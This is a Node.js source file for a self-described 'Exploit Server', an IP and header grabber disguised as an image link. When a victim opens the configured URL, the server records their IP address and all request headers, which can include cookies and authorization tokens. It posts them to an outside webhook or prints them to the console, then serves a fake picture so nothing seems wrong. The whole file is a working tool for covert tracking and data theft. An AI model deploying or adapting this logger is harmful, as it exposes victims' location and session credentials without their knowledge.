/*
  MIT License

  Copyright (c) 2021 тєαм ɮʟʊʀʀʏ

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
const express = require('express');
const fs = require('fs');
const https = require('https');
const app = express();
const fetch = require('node-fetch');
const path = require('path');
const config = require('./config.json');

app.get(config.urlpath, async function (req, res) {
  let data = "";

  data += req.ip + ":\n\n";

  for (h in req.headers)
    data +=  h + ": " + req.headers[h] + "\n";


  sendMessage(data);
  res.sendFile(path.join(__dirname, config.fakepicture));
})

https.createServer({
  key: fs.readFileSync('server.key'),   // Private Key File for SSL
  cert: fs.readFileSync('server.cert')  // Certificate File for SSL
}, app).listen(config.port, function () {
  console.log('Exploit Server started!');
  console.log('Port: ' + config.port);
})

async function sendMessage(message) {
  switch (config.output.type.toLowerCase()) {
    case "webhook":
      await fetch(config.output.webhook.url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({"username": config.output.webhook.name, "avatar_url": config.output.webhook.profilepicture, "content": message})
      })
      break;

    case "console":
      console.log(message);
      break;
  }
}